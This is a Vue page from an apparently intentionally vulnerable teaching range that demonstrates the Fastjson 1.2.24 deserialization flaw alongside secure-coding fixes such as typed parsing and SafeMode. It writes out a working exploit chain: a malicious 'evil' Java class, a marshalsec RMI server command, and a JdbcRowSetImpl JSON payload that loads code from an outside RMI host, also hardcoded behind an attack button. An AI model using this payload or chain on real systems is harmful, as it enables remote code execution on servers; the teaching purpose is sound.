<template>
    <div class="root-div">
        <div class="vuln-info">
            <div class="header-div">组件漏洞 -- Fastjson反序列化漏洞</div>
            <div class="body-div">
                <el-tabs v-model="activeName" @tab-click="handleClick">
                    <el-tab-pane label="漏洞描述" name="first">
                        <div class="vuln-detail">
                            fastjson是阿里巴巴的开源JSON解析库，它可以解析JSON格式的字符串，支持将Java
                            Bean序列化为JSON字符串，也可以从JSON字符串反序列化到JavaBean，历史上存在多个反序列化漏洞。这里演示的是Fastjson 1.2.24版本。
                        </div>
                    </el-tab-pane>
                    <el-tab-pane label="漏洞危害" name="second">
                        <div class="vuln-detail">
                            攻击者可以通过构造恶意JSON数据，在目标系统上执行任意代码，导致数据泄露、系统瘫痪或服务器被完全控制。
                        </div>
                    </el-tab-pane>
                    <el-tab-pane label="安全编码" name="third">
                        <div class="vuln-detail">
                            方案一、对于第三方依赖组件，需要及时更新版本 <br>
                            方案二、通过配置以下参数开启 SafeMode 来防护攻击：ParserConfig.getGlobalInstance().setSafeMode(true)<br>
                            方案三、明确反序列化的类，不要使用泛型反序列化，例如：JSON.parseObject(json, User.class)
                        </div>
                    </el-tab-pane>
                    <el-tab-pane label="参考文章" name="fourth">
                        <div class="vuln-detail">
                            <a href="https://mp.weixin.qq.com/s/m4HDlU0hEMwCHG6UqqJPrQ?token=1252184616&lang=zh_CN&poc_token=HFtyp2ejKP2CqnMgyCJIv3aaE6whbkkZbntZ7dsO"
                                target="_blank" style="text-decoration: underline;">《FastJson1.2.24复现》</a><br />
                        </div>
                    </el-tab-pane>
                </el-tabs>
            </div>
        </div>
        <div class="code-demo">
            <!-- gutter 属性用于设置栅格布局中列与列之间的间距；
             span 属性用于指定 <el-col> 元素所占据的栅格数，在 Element UI 中，栅格系统被分为24列（即24栅格），通过指定 span 属性的值，可以控制每个 <el-col> 元素在布局中所占据的栅格数 -->
            <el-row :gutter="20" class="grid-flex">
                <el-col :span="12">
                    <div class="grid-content bg-purple">
                        <el-row type="flex" justify="space-between" align="middle">漏洞代码<div>
                                <el-button type="danger" round size="mini"
                                    @click="fetchDataAndFillTable1">去测试</el-button>
                            </div></el-row>
                        <pre v-highlightjs><code class="java">// 漏洞复现步骤
1、构造静态恶意类，并编译成 evil.class 文件
    import java.lang.Runtime;
    import java.lang.Process;
    import java.io.IOException;
    import java.io.FileWriter;

    public class evil {
        public evil (){
            try{
                // Runtime.getRuntime().exec("calc.exe"); // Windows本地源码部署
                // Runtime.getRuntime().exec("open -a Calculator"); // macOS本地源码部署
                String content = "This is a test flag";
                String filePath = "/app/flag.txt";
                
                FileWriter writer = new FileWriter(filePath);
                writer.write(content);
                writer.close();
            }catch (Exception e){
                e.printStackTrace();
            }
        }
        public static void main(String[] argv){
            evil e = new evil();
        }
    }

2、将 evil.class 放到任意http服务器上(如：python3 -m http.server 8088)
3、部署rmi/ldap服务，关联静态恶意类（如：java -cp marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.RMIRefServer "http://xx.xx.xx.xx:8088/#evil" 9999）
4、发送payload请求到fastjson漏洞接口
    {
        "@type":"com.sun.rowset.JdbcRowSetImpl",
        "dataSourceName":"rmi://150.109.15.229:9999/evil",
        "autoCommit":true
    }

注意：需要在项目中配置启用 RMI 协议支持从远程服务器加载 Java 对象：System.setProperty("com.sun.jndi.rmi.object.trustURLCodebase", "true");

// 后端代码
@RestController
@Slf4j
@RequestMapping("/components")
public class FastjsonController {

    @PostMapping("/fastjsonVuln1")
    public Result fastjsonVuln1(@RequestBody String json) {
        log.info("请求参数: {}", json);
        // 进行fastjson反序列化，需要对下面的代码进行try catch异常处理
        try {
            Object object = JSON.parse(json);
            return Result.success(object.toString());
        } catch (Exception e) {
            return Result.error(e.toString());
        }
    }
}
</code></pre>
                    </div>
                </el-col>
                <el-col :span="12">
                    <div class="grid-content bg-purple">
                        <el-row type="flex" justify="space-between" align="middle">安全代码 - 限制反序列化的实体类型 <el-button
                                type="success" round size="mini"
                                @click="fetchDataAndFillTable2">去测试</el-button></el-row>
                        <pre v-highlightjs><code class="java">说明：下面的代码限制了只能反序列化为User类型，可以有效防止恶意攻击

// 后端代码
@RestController
@Slf4j
@RequestMapping("/components")
public class FastjsonController {

    @PostMapping("/fastjsonSec1")
    public Result fastjsonSec1(@RequestBody String json) {
        log.info("请求参数: {}", json);
        // 进行fastjson反序列化，需要对下面的代码进行try catch异常处理
        try {
            // 限制了只能反序列化为User类型
            Object object = JSON.parseObject(json, User.class);
            return Result.success(object.toString());
        } catch (Exception e) {
            return Result.error(e.toString());
        }
    }

}
</code></pre>
                    </div>
                </el-col>
            </el-row>
            <el-row :gutter="20" class="grid-flex">
                <el-col :span="12">
                </el-col>
                <el-col :span="12">
                    <div class="grid-content bg-purple">
                        <el-row type="flex" justify="space-between" align="middle">安全代码 - 使用最新版本并启用SafeMode</el-row>
                        <pre v-highlightjs><code class="java">// 在1.2.68之后的版本，Fastjson增加了safeMode的支持，开启后可完全禁用autoType，注意评估对业务的影响。
// https://github.com/alibaba/fastjson/wiki/fastjson_safemode

public String safe1(@RequestBody String content) {
    ParserConfig.getGlobalInstance().setSafeMode(true); // 开启SafeMode
    Object obj = JSON.parse(content);
    return obj.toString()
}

&lt;dependency&gt;
    &lt;groupId&gt;com.alibaba&lt;/groupId&gt;
    &lt;artifactId&gt;fastjson&lt;/artifactId&gt;
    &lt;version&gt;最新版&lt;/version&gt;
&lt;/dependency&gt;
</code></pre>
                    </div>
                </el-col>
            </el-row>
        </div>

        <!-- 打开嵌套表格的对话框1 -->
        <el-dialog title="Fastjson反序列化测试" :visible.sync="dialogFormVisible1" class="center-dialog">
            <div style="text-align: left; color: red; font-style: italic;">
                注意，需要提前先完成下面两步准备工作：<br>
                1、将 evil.class 放到任意http服务器上(如：python3 -m http.server 8088)<br>
                2、部署rmi/ldap服务，关联静态恶意类（如：java -cp marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.RMIRefServer
                "http://xx.xx.xx.xx:8088/#evil" 9999）
            </div>
            <el-form class="demo-form-inline">
                <el-form-item label="Payload1">
                    <el-input v-model="jsonString1" type="textarea"></el-input>
                </el-form-item>
                <el-form-item label="Payload1">
                    <el-input v-model="jsonString2" type="textarea"></el-input>
                </el-form-item>
                <el-form-item>
                    <el-button type="primary" @click="onSubmit11">正常请求</el-button>
                    <el-button type="danger" @click="onSubmit12">恶意攻击</el-button>
                </el-form-item>
            </el-form>
            <div>
                <template>
                    <div v-html="resp_text1"></div>
                </template>
            </div>
        </el-dialog>

        <!-- 打开嵌套表格的对话框2 -->
        <el-dialog title="Fastjson反序列化测试" :visible.sync="dialogFormVisible2" class="center-dialog">
            <div style="text-align: left; color: red; font-style: italic;">
                注意，需要提前先完成下面两部准备工作：<br>
                1、将 evil.class 放到任意http服务器上(如：python3 -m http.server 8088)<br>
                2、部署rmi/ldap服务，关联静态恶意类（如：java -cp marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.RMIRefServer
                "http://xx.xx.xx.xx:8088/#evil" 9999）
            </div>
            <el-form class="demo-form-inline">
                <el-form-item label="Payload1">
                    <el-input v-model="jsonString1" type="textarea"></el-input>
                </el-form-item>
                <el-form-item label="Payload1">
                    <el-input v-model="jsonString2" type="textarea"></el-input>
                </el-form-item>
                <el-form-item>
                    <el-button type="primary" @click="onSubmit21">正常请求</el-button>
                    <el-button type="danger" @click="onSubmit22">恶意攻击</el-button>
                </el-form-item>
            </el-form>
            <div>
                <template>
                    <div v-html="resp_text1"></div>
                </template>
            </div>
        </el-dialog>
    </div>
</template>

<script>
import axios from 'axios';
import { fastjsonVuln1, fastjsonSec1 } from '@/api/fastjson';

export default {
    data() {
        return {
            activeName: 'first',
            dialogFormVisible1: false,
            dialogFormVisible2: false,
            payload1: {
                "id": 1,
                "username": "zhangsan",
                "name": "张三"
            },
            payload2: {
                "@type": "com.sun.rowset.JdbcRowSetImpl",
                "dataSourceName": "rmi://150.109.15.229:9999/evil",
                "autoCommit": true
            },
            resp_text1: '',
        };
    },
    computed: {
        jsonString1: {
            get() {
                return JSON.stringify(this.payload1, null, 2); // 转换为格式化 JSON 字符串
            },
            set(newVal) {
                try {
                    this.model = JSON.parse(newVal); // 解析 JSON 字符串
                } catch (e) {
                    console.error("JSON 解析错误:", e);
                }
            }
        },
        jsonString2: {
            get() {
                return JSON.stringify(this.payload2, null, 2); // 转换为格式化 JSON 字符串
            },
            set(newVal) {
                try {
                    this.model = JSON.parse(newVal); // 解析 JSON 字符串
                } catch (e) {
                    console.error("JSON 解析错误:", e);
                }
            }
        }
    },
    methods: {
        handleClick(tab, event) {
            // console.log(tab, event);
        },
        fetchDataAndFillTable1() {
            this.dialogFormVisible1 = true; // 显示对话框
            this.resp_text1 = '';
        },
        fetchDataAndFillTable2() {
            this.dialogFormVisible2 = true; // 显示对话框
            this.resp_text1 = '';
        },
        onSubmit11() {
            if (!this.payload1 || !this.payload2) {
                // 如果提交内容为空，显示错误提示
                this.$message.error('payload不能为空');
                return;
            }
            fastjsonVuln1(this.payload1).then(response => {
                // this.resp_text1.push(response.data);
                this.resp_text1 = "反序列化完成";
                console.log(response.data);
            }).catch(error => {
                console.error('Error fetching data:', error);
            });
        },
        onSubmit12() {
            if (!this.payload1 || !this.payload2) {
                // 如果提交内容为空，显示错误提示
                this.$message.error('payload不能为空');
                return;
            }
            fastjsonVuln1(this.payload2).then(response => {
                // this.resp_text1.push(response.data);
                this.resp_text1 = "反序列化完成";
                console.log(response.data);
            }).catch(error => {
                console.error('Error fetching data:', error);
                this.resp_text1 = "弹calc了吧^_^";
            });
        },
        onSubmit21() {
            if (!this.payload1 || !this.payload2) {
                // 如果提交内容为空，显示错误提示
                this.$message.error('payload不能为空');
                return;
            }
            fastjsonSec1(this.payload1).then(response => {
                // this.resp_text1.push(response.data);
                this.resp_text1 = "反序列化完成";
                console.log(response.data);
            }).catch(error => {
                console.error('Error fetching data:', error);
            });
        },
        onSubmit22() {
            if (!this.payload1 || !this.payload2) {
                // 如果提交内容为空，显示错误提示
                this.$message.error('payload不能为空');
                return;
            }
            fastjsonSec1(this.payload2).then(response => {
                // this.resp_text1.push(response.data);
                this.resp_text1 = "反序列化完成";
                console.log(response.data);
            }).catch(error => {
                console.error('Error fetching data:', error);
                this.resp_text1 = "弹不了一点calc^_^";
            });
        },
    }
};
</script>

<style>
.vuln-info {
    /* 设置边框 */
    /* border: 1px solid #ccc; */
    /* 设置边框圆角 */
    border-radius: 10px;
    /* 设置外边距 */
    margin-left: 20px;
    margin-right: 20px;
    margin-bottom: 20px;
    margin-top: 10px;
}

.header-div {
    font-size: 24px;
    color: #409EFF;
    /* 设置字体加粗 */
    font-weight: bold;
    /* 设置内边距 */
    padding: 10px;
    /* 水平居中 */
    justify-content: center;
    /* 垂直居中 */
    align-items: center;
    /* 添加底部边框线条，颜色为灰色 */
    border-bottom: 1px solid #ccc;

}

.body-div {
    /* 设置内边距 */
    padding: 10px;
    justify-content: center;
    /* 水平居中 */
    align-items: center;
    /* 垂直居中 */
    font-family: Arial, sans-serif;
    /* 设置字体为 Arial，并指定备用字体 */
    font-size: 14px;
    /* 设置字体大小为 16像素 */
}

.vuln-detail {
    background-color: #dce9f8;
    padding: 10px;

}

.code-demo {
    /* 设置外边距 */
    margin: 20px;
    border-top: 1px solid #ccc;
    padding-top: 20px;
}

pre code {
    /* 设置字体大小为 14px */
    font-size: 12px;
}

.el-row {
    margin-bottom: 20px;
}

.el-row:last-child {
    margin-bottom: 0;
}

.el-col {
    border-radius: 4px;
}

.bg-purple-dark {
    background: #99a9bf;
}

.bg-purple {
    background: #d3dce6;
}

.bg-purple-light {
    background: #e5e9f2;
}

.grid-content {
    border-radius: 4px;
    /* min-height: 36px; */
    height: 100%;
    padding: 10px;

}

.grid-flex {
    display: flex;
    align-items: stretch;
    /* 让子元素在交叉轴方向（垂直方向）拉伸以匹配高度 */
}

.row-bg {
    padding: 10px 0;
    background-color: #f9fafc;
}

.center-dialog {
    text-align: center;
    margin: 0 auto;
}

.center-dialog-table {
    text-align: center;
}
</style>